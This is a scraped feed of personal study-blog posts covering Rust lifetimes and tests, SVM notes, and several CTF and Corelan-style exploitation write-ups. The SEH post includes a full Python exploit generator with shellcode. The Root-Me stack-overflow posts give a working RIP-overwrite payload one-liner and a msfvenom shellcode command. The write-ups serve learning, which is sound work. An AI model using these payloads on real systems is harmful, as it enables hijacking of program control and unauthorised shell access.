<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let string1 = String::from(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line">    let string2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    let result = longest(string1.as_str(), string2);</span><br><span class="line">    println!(<span class="string">&quot;The longest string is &#123;&#125;&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn longest&lt;<span class="string">&#x27;a&gt;(x: &amp;&#x27;</span>a str, <span class="symbol">y:</span> &amp;<span class="string">&#x27;a str) -&gt; &amp;&#x27;</span>a str &#123;</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>返回的引用取最短的lifetime</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct ImportantExcerpt&lt;<span class="string">&#x27;a&gt; &#123;</span></span><br><span class="line"><span class="string">    part: &amp;&#x27;</span>a str,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let novel = String::from(<span class="string">&quot;Call me Ishmael. Some years ago...&quot;</span>);</span><br><span class="line">    let first_sentence = novel.split(<span class="string">&#x27;.&#x27;</span>).<span class="keyword">next</span>().expect(<span class="string">&quot;Could not find a &#x27;.&#x27;&quot;</span>);</span><br><span class="line">    let i = ImportantExcerpt &#123;</span><br><span class="line">        <span class="symbol">part:</span> first_sentence,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>an instance of ImportantExcerpt can’t <code>outlive the reference it</code><br>holds in its part field.</p>
<h3 id="Lifetime-Elision"><a href="#Lifetime-Elision" class="headerlink" title="Lifetime Elision"></a>Lifetime Elision</h3><p>由编译器进行引用lifetime的编写<br>三个阶段</p>
<h4 id="The-Static-Lifetime"><a href="#The-Static-Lifetime" class="headerlink" title="The Static Lifetime"></a>The Static Lifetime</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">let <span class="symbol">s:</span> &amp;<span class="string">&#x27;static str = &quot;I have a static lifetime.&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>means that this reference can live for the entire duration of the program</p>
<p> lifetimes are a type of generic,<br>fn main() {<br>    let string1 = String::from(“abcd”);<br>    let string2 = “xyz”;</p>
<pre><code>let result = longest_with_an_announcement(
    string1.as_str(),
    string2,
    &quot;Today is someone&#39;s birthday!&quot;,
);
println!(&quot;The longest string is &#123;&#125;&quot;, result);</code></pre>
<p>}</p>
<p>use std::fmt::Display;</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn longest_with_an_announcement&lt;<span class="string">&#x27;a, T&gt;(</span></span><br><span class="line"><span class="string">    x: &amp;&#x27;</span>a str,</span><br><span class="line">    <span class="symbol">y:</span> &amp;<span class="string">&#x27;a str,</span></span><br><span class="line"><span class="string">    ann: T,</span></span><br><span class="line"><span class="string">) -&gt; &amp;&#x27;</span>a str</span><br><span class="line">where</span><br><span class="line">    <span class="symbol">T:</span> Display,</span><br><span class="line">&#123;</span><br><span class="line">    println!(<span class="string">&quot;Announcement! &#123;&#125;&quot;</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>cargo test<br>Checking Results with the assert! Macro<br>The <code>assert! </code>macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true.</p>
<p><code>assert_eq! and assert_ne!</code>These macros compare two arguments for equality or inequality, respectively. </p>
<p>should_panic  产生panic返回正确</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">pub struct Guess &#123;</span><br><span class="line">    <span class="symbol">value:</span> i32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Guess &#123;</span><br><span class="line">    pub fn new(<span class="symbol">value:</span> i32) -&gt; Guess &#123;</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">1</span> <span class="params">||</span> value &gt; <span class="number">100</span> &#123;</span><br><span class="line">            panic!(<span class="string">&quot;Guess value must be between 1 and 100, got &#123;&#125;.&quot;</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Guess &#123; value &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[cfg(test)]</span></span><br><span class="line">mod tests &#123;</span><br><span class="line">    use super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#[test]</span></span><br><span class="line">    <span class="comment">#[should_panic]</span></span><br><span class="line">    fn greater_than_10<span class="number">0</span>() &#123;</span><br><span class="line">        Guess::new(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[test]</span></span><br><span class="line"><span class="comment">#[should_panic(expected = &quot;Guess value must be less than or equal to 100&quot;)]</span></span><br></pre></td></tr></table></figure>

<p>the unit type, ()</p>
<p>TDD process</p>
<p>test 还是很不多的，C++的时候都一遍遍输入参数</p>
<p><code>$ cargo run &gt; output.txt</code></p>
]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>SEH</title>
    <url>/2020/09/21/SEH/</url>
    <content><![CDATA[<h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a>
<p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p>
<p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p>
<p>the <code>first pop</code> will take off<code> 4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code> ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p>
<h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p>
<h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p>
<p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p>
<p>int 3 指令（0xcc） 中断指令</p>
<pre><code>import struct

uitext = &quot;ui_exploit.txt&quot;
junk = &quot;\x41&quot; * 584
seh_next = &quot;\xeb\x04\x90\x90&quot;
seh_handler = str(struct.pack(&#39;&lt;L&#39;, 0x10018de8))
shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\
            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\
            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\
            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\
            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\
            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\
            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\
            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\
            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\
            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\
            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\
            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\
            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\
            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\
            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\
            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\
            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\
            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\
            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\
            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\
            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\
            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;
junk2 = &quot;\x90&quot; * 1000
fp = open(uitext, &#39;w&#39;)
content = junk + seh_next + seh_handler + shellcode + junk2
fp.write(content)
fp.close()</code></pre>
<p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p>
<p>frog 青蛙</p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>SVM学习笔记1</title>
    <url>/2020/03/31/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<p><a href="https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s">https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s</a><br>参考视频课程</p>
<p>mvnrnd（）产生特定均值和协方差的矩阵</p>
<hr>
<a id="more"></a>

<p>kenel 矩阵要有限正半定，kenel函数：R^d-&gt;R<br><a href="https://imgchr.com/i/GQilQJ"><img src="https://s1.ax1x.com/2020/03/31/GQilQJ.th.png" alt="GQilQJ.th.png"></a></p>
<hr>
<p>常见kenel 可以自己构造<br><a href="https://imgchr.com/i/GQF9Tx"><img src="https://s1.ax1x.com/2020/03/31/GQF9Tx.th.png" alt="GQF9Tx.th.png"></a></p>
<hr>
<p>REPRODUCING KENEL MAP<br>由kenel 推出 feature mapping 以及其逆<br><img src="https://s1.ax1x.com/2020/03/31/GQdhI1.png" alt="GQdhI1.png"></p>
<hr>
<p>Principal Component Analysis 主成分分析<br>KPCA</p>
<hr>
<p>Linear Discriminant Analysis 線性區別分析<br>投影坐标：内积*v<br>廣義區別分析(Generalized Discriminant Analysis)。</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQUvmd.png" alt="GQUvmd.png"></p>
<hr>
<p>KKT svm证明中会用到<br><img src="https://s1.ax1x.com/2020/03/31/GQdzJP.png" alt="GQdzJP.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQwZiq.png" alt="GQwZiq.png"></p>
<hr>
<p>其他</p>
<p><a href="https://ww2.mathworks.cn/help/matlab/data-type-conversion.html">https://ww2.mathworks.cn/help/matlab/data-type-conversion.html</a><br>matlab 数据类型转换</p>
<pre><code>&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</code></pre>
]]></content>
      <tags>
        <tag>SVM</tag>
      </tags>
  </entry>
  <entry>
    <title>SVM学习笔记2</title>
    <url>/2020/04/01/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p>凸二次规划 ==  开口向下</p>
<hr>
<p>分类靠支撑向量计算  其 a~=0</p>
<a id="more"></a>
<hr>
<p>hard-margin</p>
<p>soft-margin 容忍一些误差<br>每个容忍值和希望最小</p>
<hr>
<p>KKT帮助确定a ， L函数系数 拉格朗日</p>
<hr>
<p>K-fold 数据分成k份进行train test<br>获取最佳参数</p>
<p>调用crossval就是要找到参数C(惩罚系数)和sigma，使误分率mcr最小</p>
<hr>
<p>one vs one<br>多类判定投票</p>
<p>one vs all<br>有符号距离取最大</p>
<hr>
<p>才发现 matlab %%<br>%%<br>运行节</p>
<hr>
<p>代码<br>参考 <a href="http://www.matlabsky.com/thread-11026-1-1.html">http://www.matlabsky.com/thread-11026-1-1.html</a></p>
<p><code>fitcsvm()</code><br>使用<code>&#39;OptimizeHyperparameters&#39; </code>- 要优化的参数 和<br><code>&#39;HyperparameterOptimizationOptions&#39;</code> - 优化的选项<br><code>来找到最佳sigma 和 C 罚因子</code></p>
]]></content>
      <tags>
        <tag>SVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack buffer overflow - basic</title>
    <url>/2020/11/24/Stack-buffer-overflow-basic/</url>
    <content><![CDATA[<h2 id="ELF-x64-Stack-buffer-overflow-basic"><a href="#ELF-x64-Stack-buffer-overflow-basic" class="headerlink" title="ELF x64 - Stack buffer overflow - basic"></a>ELF x64 - Stack buffer overflow - basic</h2><p><em>gdb 内 查看函数</em></p>
<p><code>info functions</code></p>
<pre><code>0x0000000000401152  callMeMaybe
0x0000000000401193  main</code></pre>
<a id="more"></a>
<hr>
<p>ret 后<br>会将rsp指向的内容压入RIP，转移程序执行流</p>
<hr>
<p>题目源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callMeMaybe</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> len, i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="主要思路："><a href="#主要思路：" class="headerlink" title="主要思路："></a>主要思路：</h3><p><a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf">http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf</a><br>根据这篇文章<br>通过溢出来控制RIP，将其指向我们想要的函数</p>
<ol>
<li>先向buffer中输入字符，执行到<code>ret</code>时，查看<code>RSP</code>的值，确定需要多少位可以溢出到<code>RSP</code>位</li>
<li>可以确定需要<code>0x110</code> 即<code>280</code>位，之后添加的字符就会输入进<code>RIP</code>中</li>
<li>我们需要的是执行<code>callMeMaybe()</code>，所以将函数地址倒序添加进末尾（因为小端序）</li>
</ol>
<hr>
<h3 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h3><pre><code>[0x00401193]&gt; fs symbols;f
0x00401000 23 sym._init
0x00401070 42 entry0
0x00401070 43 sym._start
0x004010a0 1 sym._dl_relocate_static_pie
0x004010b0 33 sym.deregister_tm_clones
0x004010e0 49 sym.register_tm_clones
0x00401120 33 entry.fini0
0x00401120 0 sym.__do_global_dtors_aux
0x00401150 2 entry.init0
0x00401150 0 sym.frame_dummy
0x00401152 65 sym.callMeMaybe
0x00401193 103 main
0x00401193 103 sym.main</code></pre>
<h3 id="“a”-280-”B”-6"><a href="#“a”-280-”B”-6" class="headerlink" title="“a”*280+”B”*6"></a>“a”*280+”B”*6</h3><pre><code>gdb-peda$ x/290xb $rbp-0x110
0x7fffffffdb80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdb88:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdb90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdb98:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdba0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdba8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbb0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbb8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbc0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbc8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbd0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbd8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbe0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbe8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbf0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdbf8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc28:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc30:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc38:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc40:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc48:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc50:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc58:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc60:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc68:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc70:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc78:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc88:    0x61    0x61    0x61    0x61    0x1e    0x01    0x00    0x00
0x7fffffffdc90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdc98:    0x42    0x42    0x42    0x42    0x42    0x42    0x00    0x00
0x7fffffffdca0:    0x88    0xdd</code></pre>
<hr>
<p>成功控制RIP<br>RSP: 0x7fffffffdc98 –&gt; 0x424242424242 (‘BBBBBB’)<br>Invalid $PC address: 0x424242424242</p>
<p>最后的payload:<br><code>(python -c &#39;print &quot;A&quot; * 280  + &quot;\xe7\x05\x40\x00\x00\x00\x00\x00&quot;&#39; ; cat ) | ./ch35</code></p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack buffer and integer overflow</title>
    <url>/2021/01/07/Stack_buffer_and_integer_overflow/</url>
    <content><![CDATA[<h1 id="ELF-x86-Stack-buffer-and-integer-overflow"><a href="#ELF-x86-Stack-buffer-and-integer-overflow" class="headerlink" title="ELF x86 - Stack buffer and integer overflow"></a>ELF x86 - Stack buffer and integer overflow</h1><p>永远的神：：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow</a></p>
<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>为了让shell更实用<br>覆盖<code>EIP</code>, 使用现有的命令的地址，例如<code>jmp esp</code> ， 跳转buffer ， 后面是shellcode</p>
<h3 id="查找jmp-call-esp地址"><a href="#查找jmp-call-esp地址" class="headerlink" title="查找jmp/call esp地址"></a>查找jmp/call esp地址</h3><ol>
<li>可以在共享库中找</li>
<li>也可以在自身程序找命令<a id="more"></a>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$objdump -d vulnerable_1 | grep <span class="string">&quot;eax&quot;</span></span><br><span class="line"><span class="number">1019</span>:	ff d0                	call   *%eax</span><br></pre></td></tr></table></figure>
或者启动<code>metasploit-framework</code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">msf6 &gt; msfelfscan -j eax vulnerable_1</span><br><span class="line">[*] exec: msfelfscan -j eax vulnerable_1</span><br><span class="line">[vulnerable_1]</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br></pre></td></tr></table></figure>
“jmp/call eax”都行<br>use linux/x86/exec<h3 id="用msfvenom生成payload"><a href="#用msfvenom生成payload" class="headerlink" title="用msfvenom生成payload"></a>用msfvenom生成payload</h3><code>Msfvenom</code> 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。<br><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br><code>msfvenom -p linux/x86/exec CMD=dash R -a x86 -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python </code></li>
</ol>
<hr>
<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p><a href="https://sploitfun.wordpress.com/2015/06/23/integer-overflow/">https://sploitfun.wordpress.com/2015/06/23/integer-overflow/</a></p>
<p>Storing<code>a value greater</code>than <code>maximum supported value</code> is called integer overflow.  an integer overflow might <code>lead to stack overflow or heap overflow</code> which could result in arbitrary code execution.<br>对数组长度检查失效</p>
<p>Similarly storing a value lesser than the minimum supported value is called integer underflow.</p>
<p><code> 261</code> gets wrapped around and stored as 5 in ‘passwd_len’ variable<br><code>000100000101 取8位 为5</code></p>
<hr>
<h2 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 128</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_file</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> path[BUFFER+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> size;  </span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(read(fd, &amp;size, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) != <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] File too short.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(size &gt;= BUFFER)  <span class="comment">//绕过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Path too long.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  read_data(path, fd, size);</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Need a absolute path.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] The pathname is : %s\n&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="read-命令"><a href="#read-命令" class="headerlink" title="read 命令"></a>read 命令</h3><p>ssize_t read(int fd, void *buf, size_t count);<br>read() attempts to <strong>read up to count bytes **from file descriptor fd into the</strong> buffer starting at buf**.</p>
<p> On success, the <code>number of bytes read is returned</code> (zero indicates end of file), and the file position is <strong>advanced by this number.</strong></p>
<hr>
